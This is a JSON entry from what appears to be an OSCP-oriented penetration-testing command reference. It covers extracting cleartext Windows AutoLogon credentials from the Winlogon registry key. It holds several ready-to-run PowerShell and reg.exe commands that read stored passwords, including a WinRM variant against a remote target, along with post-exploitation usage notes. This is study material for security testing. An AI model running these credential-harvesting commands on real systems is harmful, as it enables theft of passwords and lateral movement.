{
  "commands": [
    {
      "id": "ps-registry-autologon",
      "name": "PowerShell Registry AutoLogon Credential Extraction",
      "description": "One-liner commands to extract cleartext credentials from Windows Registry AutoLogon keys",
      "command": "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName",
      "category": "post-exploit",
      "subcategory": "CREDENTIAL_HARVESTING",
      "os": "WINDOWS",
      "variables": [],
      "flags": [
        {
          "flag": "Get-ItemProperty",
          "description": "Reads registry key properties (similar to reg query)",
          "default_value": null
        },
        {
          "flag": "-Path",
          "description": "Registry path to query (supports HKLM:\\, HKCU:\\ PowerShell drive notation)",
          "default_value": null
        },
        {
          "flag": "Select-Object",
          "description": "Filters output to show only specified properties",
          "default_value": "All properties"
        }
      ],
      "examples": [
        {
          "command": "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName",
          "description": "Extract AutoLogon credentials (username, password, domain) from registry",
          "context": "Credential harvesting from registry AutoLogon configuration"
        },
        {
          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
          "description": "Alternative using reg.exe to query DefaultPassword value directly",
          "context": "Non-PowerShell equivalent using cmd.exe"
        },
        {
          "command": "(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon').DefaultPassword",
          "description": "Extract only the DefaultPassword value (returns plaintext password)",
          "context": "Quick password extraction without formatting"
        },
        {
          "command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Format-List Default*",
          "description": "List all properties starting with 'Default' (includes AutoAdminLogon, DefaultUserName, DefaultPassword, DefaultDomainName)",
          "context": "Comprehensive AutoLogon configuration review"
        }
      ],
      "educational": {
        "purpose": "Extract cleartext credentials stored in Windows Registry when AutoLogon is enabled - common misconfiguration in corporate environments",
        "manual_alternative": "GUI: Run regedit.exe \u2192 Navigate to HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon \u2192 View DefaultPassword key (impractical via reverse shell)",
        "common_failures": [
          "DefaultPassword key not present - AutoLogon disabled or not configured",
          "AutoAdminLogon value is 0 - AutoLogon feature disabled",
          "Access denied - requires at least user-level privileges (not SYSTEM-only)",
          "Empty DefaultPassword - credentials removed or never set"
        ],
        "when_to_use": [
          "After gaining initial user or SYSTEM access on Windows workstation/server",
          "Automated post-exploitation credential harvesting phase",
          "When searching for lateral movement or privilege escalation credentials",
          "OSCP lab environments often have AutoLogon configured for convenience"
        ],
        "exam_relevance": "MEDIUM - AutoLogon misconfigurations appear in OSCP labs. Credentials often enable lateral movement or provide admin access.",
        "time_estimate": "<5 seconds",
        "technical_notes": [
          "AutoLogon stores credentials in HKLM (Local Machine hive) - accessible to all users",
          "DefaultPassword is REG_SZ (string) value containing plaintext password",
          "AutoAdminLogon=1 indicates AutoLogon is enabled",
          "DefaultDomainName may be blank (local account) or contain domain name",
          "Alternative locations: HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI"
        ]
      },
      "oscp_priority": "MEDIUM",
      "tags": [
        "POWERSHELL",
        "REGISTRY",
        "CREDENTIALS",
        "POST_EXPLOIT",
        "AUTOLOGON",
        "OSCP:MEDIUM"
      ],
      "related_commands": [
        "ps-search-credentials",
        "ps-search-desktop-flags",
        "reg-query-credentials"
      ],
      "registry_key_structure": {
        "path": "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "values": {
          "AutoAdminLogon": "1 if enabled, 0 if disabled (REG_SZ)",
          "DefaultUserName": "Username for automatic login (REG_SZ)",
          "DefaultPassword": "Plaintext password (REG_SZ) - SECURITY RISK",
          "DefaultDomainName": "Domain name or blank for local account (REG_SZ)"
        }
      },
      "one_liner_combos": [
        {
          "description": "Remote registry query via WinRM",
          "command": "Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName}"
        },
        {
          "description": "Check if AutoLogon is enabled before extracting credentials",
          "command": "if((Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon').AutoAdminLogon -eq '1'){Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName,DefaultPassword,DefaultDomainName}"
        }
      ]
    }
  ]
}